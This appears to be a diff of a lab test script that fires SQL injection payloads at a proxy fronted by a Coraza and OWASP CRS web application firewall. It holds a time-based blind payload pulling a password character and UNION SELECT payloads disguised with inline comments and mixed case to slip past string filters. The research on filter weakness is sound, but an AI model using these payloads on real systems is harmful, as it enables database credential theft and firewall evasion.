@@ -60,9 +60,13 @@ timed "3b. condition TRUE  -> ~3s delay (SLEEP fired)" \
   "zzz' UNION SELECT IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username=0x616c696365)=0x61,SLEEP(3),0),2,3,4,5,6,7-- -"
 
 hr "4. WAF / SIGNATURE EVASION (same UNION, obfuscated to dodge naive filters)"
-# No WAF in Phase 1, so these still succeed -- the point is that a *string* filter
-# for 'UNION SELECT' is defeated while the query's STRUCTURE is unchanged (a
-# parser still sees a UNION). This is the core of the 'low-rung' argument.
+# The proxy now runs a live Coraza + OWASP CRS WAF: 172.30.0.10:80 ENFORCES
+# (blocks with 403), :8080 is detection-only (logs, forwards). This script hits
+# :80, so these are real evasion ATTEMPTS against CRS, not free wins -- the plain
+# "UNION SELECT" in other sections may be 403'd here. The point is that a *string*
+# filter for 'UNION SELECT' is defeated while the query's STRUCTURE is unchanged
+# (a parser still sees a UNION). Check what CRS actually did in /shared/waf_audit.log,
+# and compare against the detection port (172.30.0.10:8080) for the pre-WAF baseline.
 send "4a. inline comment replaces the space between keywords: UNION/**/SELECT" \
   "zzz' UNION/**/SELECT 1,username,password,4,5,6,7 FROM users-- -"
 send "4b. mixed case: uNiOn sElEcT" \
